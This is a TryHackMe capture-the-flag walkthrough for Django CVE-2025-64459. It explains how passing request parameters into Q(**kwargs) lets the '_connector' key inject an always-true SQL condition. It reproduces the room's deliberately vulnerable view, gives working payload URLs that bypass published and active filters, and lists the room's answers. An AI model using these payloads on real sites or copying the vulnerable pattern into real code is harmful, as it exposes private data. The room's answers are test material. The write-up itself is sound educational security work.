# Exploiting Django CVE‑2025‑64459 on TryHackMe: Complete Walkthrough

## 1. Introduction

Hi everyone, today we will take a closer look at a recently disclosed Django vulnerability that demonstrates how a single coding mistake can completely undermine the security of a web application. The vulnerability is tracked as CVE 2025 64459 and affects Django’s QuerySet API when developers misuse user input with internal ORM mechanisms.

This [TryHackMe room](https://tryhackme.com/room/djangocve202564459) provides a hands-on demonstration of the issue. You will see how a vulnerable Django view processes query parameters, how attackers can tamper with internal ORM controls, and how the exploitation leads to full data exposure. This write up covers both the technical explanation and a full reproduction of the attack paths used in the room.

---

## 2. What is Django

Django is a Python web framework widely used in enterprise environments, SaaS platforms, and high traffic websites. One of its strongest features is the built-in Object Relational Mapping system, often referred to as the ORM. Instead of writing raw SQL queries, developers interact with the database through Python functions and classes.

Example:

```
User.objects.filter(is_active=True)
```

The ORM translates this into SQL automatically. Developers can combine multiple conditions by chaining filters, or by using Django’s Q objects.

Example with Q objects:

```python
from django.db.models import Q
User.objects.filter(Q(is_staff=True) | Q(is_superuser=True))
```

Corresponding SQL:

```
SELECT * FROM user WHERE is_staff = true OR is_superuser = true;
```

Django normally sanitizes parameters and prevents unsafe SQL injection, based on the assumption that internal ORM parameters are never exposed to users. The vulnerability occurs when that assumption is broken.

---

## 3. How the Vulnerability Occurred

The vulnerable pattern appears when a developer directly takes user input and passes it into Django’s `Q(**kwargs)` constructor:

```python
query_params = dict(request.GET.items())
q_filter = Q(**query_params)
posts = Post.objects.filter(q_filter)
```

This looks convenient but dangerous. Django’s ORM accepts several internal magic keys intended only for internal use:

* **_connector**
* **_negated**

Before the patch, Django allowed both keys through.

### Why this is dangerous

Manipulating these keys allows attackers to:

* Change how SQL conditions are combined
* Negate entire filters
* Bypass access controls
* Retrieve sensitive or unpublished records

Example attack:

```
?_connector=OR 1=1 OR
```

This forces the ORM to interpret the injected connector, creating an always-true condition.

Django’s patch now rejects attempts to set these internal parameters.

---

## 4. Exploiting the TryHackMe Room

The room recreates a vulnerable Django application:

```python
query_params = dict(request.GET.items())
if not any(param.startswith('is_published') for param in query_params.keys()):
    query_params['is_published'] = True
if not any(param.startswith('id') for param in query_params.keys()):
    query_params['id__lt'] = 10
q_filter = Q(**query_params)
posts = Post.objects.filter(q_filter)
```

Mistakes:

* Directly using user parameters
* Passing them into a Q object
* Attempting restrictions that can be bypassed

Below are the practical exploitation steps.

---

## 4.1 Retrieving All Blog Posts

Default page:

```
http://TARGET/poc/
```

You normally only see a few posts due to enforced filters:

* is_published=True
* id < 10

To bypass:

```
http://TARGET/poc/?author=Security%20Architect&_connector=OR%201=1%20OR
```

What happens:

* A Q object is built with a malicious connector
* Django rewrites the query into an always-true condition
* All posts become visible, including unpublished ones

This exposes the post written by the DevOps Engineer.

**Answer: Monitoring Django Apps — Advanced**

---

## 4.2 Retrieving All Employees

Employee filter:

```python
employees = Employee.objects.filter(is_active=True).order_by('last_name')
```

Page:

```
http://TARGET/poc/employees
```

Bypass:

```
http://TARGET/poc/employees/?hire_date__year=2022&_connector=OR%201=1%20OR
```

Result:

* is_active=True is overridden
* All employees become visible
* Including inactive ones

Searching for the employee hired on June 5, 2022:

**Answer: David Rodriguez**

---

## 5. Conclusion

In production environments, this vulnerability can expose:

* Private user data
* Admin-only records
* Draft or unpublished content
* Financial or sensitive internal information

The TryHackMe room illustrates how a single misused ORM mechanism can:

* Reveal unpublished blog posts
* Reveal inactive employees
* Bypass logical access restrictions

Django patched the issue by rejecting internal parameters in QuerySet constructors.
However, the real lesson is that secure frameworks do not guarantee secure applications—developers must sanitize and validate all user-controlled data before inserting it into any query logic.
